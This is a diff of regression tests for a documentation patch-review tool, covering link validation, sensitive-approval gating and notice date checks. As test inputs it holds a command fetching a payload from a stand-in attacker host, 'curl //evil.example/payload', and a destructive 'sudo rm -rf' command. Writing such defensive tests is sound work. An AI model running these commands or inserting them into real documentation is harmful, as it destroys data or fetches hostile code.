@@ -742,6 +742,122 @@ describe("patch approval and recovery", () => {
 
 describe("review regressions", () => {
   it.each([
+    "<img src=/missing.png>",
+    "<a href=/guide/,missing>Broken</a>",
+    "<a href=/guide/;missing>Broken</a>",
+    "<a href=/guide/)missing>Broken</a>",
+    "url: /missing/",
+    "background: url(/missing.png)",
+    "curl //evil.example/payload",
+  ])("rejects unquoted relative destinations in code: %s", async (command) => {
+    const { root, run } = await fixture();
+    await propose(root, run, policy, {
+      findings: [
+        finding(run, {
+          kind: "command",
+          original: "old-command",
+          replacement: command,
+        }),
+      ],
+    });
+    await expect(createPatches(root, run, policy)).rejects.toThrow();
+  });
+  it.each([
+    "<a href=/guide/>Guide</a>",
+    "url: /guide/",
+    "background: url(/guide/)",
+    `background: url(${sourceUrl})`,
+    "cd /home/user",
+    "// A comment\necho safe",
+    "echo safe; /* comment */",
+  ])(
+    "accepts valid unquoted routes and filesystem or comment syntax: %s",
+    async (command) => {
+      const { root, run } = await fixture();
+      await propose(root, run, policy, {
+        findings: [
+          finding(run, {
+            kind: "command",
+            original: "old-command",
+            replacement: command,
+          }),
+        ],
+      });
+      expect((await createPatches(root, run, policy))[0].after).toContain(
+        command,
+      );
+    },
+  );
+  it.each([false, true])(
+    "requires sensitive approval for inline-code context changes, partial=%s",
+    async (partial) => {
+      const { root } = await fixture();
+      const original = "Do not run `sudo rm -rf /important`.";
+      await writeFile(
+        path.join(root, file),
+        source.replace("Old guidance.", original),
+      );
+      const run = await startRun(root, "inline-context", policy, [
+        { url: "/guide/", sources: [sourceUrl] },
+      ]);
+      await scan(root, run, policy, { captures: [capture()] });
+      await propose(root, run, policy, {
+        findings: [
+          finding(run, {
+            original: partial ? "Do not run" : original,
+            replacement: partial ? "Run" : "Run `sudo rm -rf /important`.",
+          }),
+        ],
+      });
+      const patches = await createPatches(root, run, policy);
+      expect(patches[0].sensitive).toBe(true);
+      expect(() => approve(run, patches, { reviewer: "Test" })).toThrow(
+        "--allow-sensitive",
+      );
+      expect(() =>
+        approve(run, patches, { reviewer: "Test", allowSensitive: true }),
+      ).not.toThrow();
+    },
+  );
+  it.each([
+    ["Warning: obsolete.", false],
+    ["2026-99-99: Warning: obsolete.", false],
+    ["2026-02-29: Warning: obsolete.", false],
+    ["2024-02-29: Warning: obsolete.", true],
+    ["2026-10-08: Warning: obsolete.", true],
+  ])(
+    "requires a real date in the newly added notice: %s",
+    async (notice, valid) => {
+      const { root } = await fixture();
+      const original = "Old guidance from 2020-01-01.";
+      await writeFile(
+        path.join(root, file),
+        source.replace("Old guidance.", original),
+      );
+      const run = await startRun(root, "notice-date", policy, [
+        { url: "/guide/", sources: [sourceUrl] },
+      ]);
+      await scan(root, run, policy, { captures: [capture()] });
+      await propose(root, run, policy, {
+        findings: [
+          finding(run, {
+            kind: "notice",
+            original,
+            replacement: `${original}\n\n${notice}`,
+          }),
+        ],
+      });
+      if (valid)
+        expect((await createPatches(root, run, policy))[0].after).toContain(
+          notice,
+        );
+      else
+        await expect(createPatches(root, run, policy)).rejects.toThrow(
+          "valid calendar date",
+        );
+    },
+  );
+  it.each([
     'new Worker("/missing.js")',
     'new WebSocket("/socket")',
     'xhr.open("GET", "/missing/")',
